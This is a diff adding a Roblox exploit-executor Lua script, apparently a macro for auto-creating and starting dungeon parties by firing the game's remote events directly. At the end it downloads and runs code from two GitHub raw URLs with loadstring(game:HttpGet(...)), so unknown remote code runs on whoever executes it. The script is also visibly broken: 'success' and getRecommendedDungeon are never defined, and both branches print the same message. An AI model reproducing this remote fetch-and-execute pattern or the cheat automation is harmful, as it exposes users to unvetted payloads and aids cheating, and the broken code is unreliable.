@@ -1,0 +1,152 @@
+-- Define the AutoMakeDungeon function
+function getgenv().AutoMakeDungeon()
+    local player = game:GetService("Players").LocalPlayer
+    local head = player.Character and player.Character:FindFirstChild("Head")
+
+    if not head then
+        warn("Head not found")
+        return
+    end
+
+    -- Retrieve the player's level from their nameplate
+    local playerNameplate = head:FindFirstChild("playerNameplate")
+    if not playerNameplate then
+        warn("playerNameplate not found")
+        return
+    end
+
+    local levelTextLabel = playerNameplate:FindFirstChild("Level")
+    if not levelTextLabel then
+        warn("Level TextLabel not found")
+        return
+    end
+
+    local playerLevel = tonumber(levelTextLabel.Text)
+    if not playerLevel then
+        warn("Unable to determine player level.")
+        return
+    end
+
+    -- Determine the recommended dungeon
+    local dungeonName, difficulty = getRecommendedDungeon(playerLevel)
+    if not dungeonName or not difficulty then
+        print("No suitable dungeon found for your level.")
+        return
+    end
+
+    -- Execute the dungeon creation and start process
+    print("Recommended Dungeon: " .. dungeonName .. " (" .. difficulty .. ")")
+
+    -- Create and start the recommended dungeon
+    local createPartyArgs = {
+        [1] = {
+            [1] = {
+                [1] = "\1",
+                [2] = {
+                    ["\3"] = "CreateParty",
+                    ["partyData"] = {
+                        ["difficulty"] = difficulty,
+                        ["minimumJoinLevel"] = playerLevel,
+                        ["tier"] = 1,
+                        ["visibility"] = "Public",
+                        ["mode"] = "Normal",
+                        ["dungeonName"] = tostring(dungeonName),
+                        ["maxPlayers"] = 40
+                    }
+                }
+            },
+            [2] = "5"
+        }
+    }
+    game:GetService("ReplicatedStorage").dataRemoteEvent:FireServer(unpack(createPartyArgs))
+
+    wait(2)
+
+    local startPartyArgs = {
+        [1] = {
+            [1] = {
+                [1] = "\1",
+                [2] = {
+                    ["\3"] = "StartParty"
+                }
+            },
+            [2] = "5"
+        }
+    }
+    game:GetService("ReplicatedStorage").dataRemoteEvent:FireServer(unpack(startPartyArgs))
+
+    print("Dungeon started successfully.")
+end
+
+-- Check for AutoMenu functionality
+if getgenv().AutoMenu then    
+    -- Execute various server calls
+    local args = {
+        [1] = {
+            [1] = {
+                [1] = "\1"
+            },
+            [2] = "2"
+        }
+    }
+    game:GetService("ReplicatedStorage").dataRemoteEvent:FireServer(unpack(args))
+    wait(1.5)
+
+    local args = {
+        [1] = {
+            [1] = "ui",
+            [2] = "LeaderboardGui"
+        }
+    }
+    game:GetService("ReplicatedStorage").Utility.AssetRequester.Remote:InvokeServer(unpack(args))
+
+    local args = { [1] = "GetWeapons" }
+    game:GetService("ReplicatedStorage").remotes.getData:InvokeServer(unpack(args))
+    game:GetService("ReplicatedStorage").remotes.reloadInvy:InvokeServer()
+
+    local args = { [1] = "Desert Temple" }
+    game:GetService("ReplicatedStorage").remotes.getDungeonStats:InvokeServer(unpack(args))
+
+    local args = {
+        [1] = {
+            [1] = {
+                [1] = "\1",
+                [2] = {
+                    ["\3"] = "select",
+                    ["characterIndex"] = 1
+                }
+            },
+            [2] = "L"
+        }
+    }
+    game:GetService("ReplicatedStorage").dataRemoteEvent:FireServer(unpack(args))   
+
+    wait(0.9)
+
+    -- Load and run the external script
+    print("Executing The Script...")
+
+    -- Check if the loadstring was successful
+    if not success then
+        print("What Happened Bru")
+    else
+        print("What Happened Bru")
+    end
+else
+    print("Macro Successfully Saved and Loaded")
+end
+
+-- Check for AutoMakeDungeons functionality
+if getgenv().AutoMakeDungeons then
+    -- Call AutoMakeDungeon to create and start a dungeon automatically
+    getgenv().AutoMakeDungeon()
+end
+
+-- Independent SolaraVersion check for script loading
+if getgenv().SolaraVersion then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/wset3/test3/refs/heads/main/3"))()
+    print("Macro Successfully Saved and Loaded")
+else
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/hen56s2/221/refs/heads/main/Pop"))()
+    print("Macro Successfully Saved and Loaded")
+end
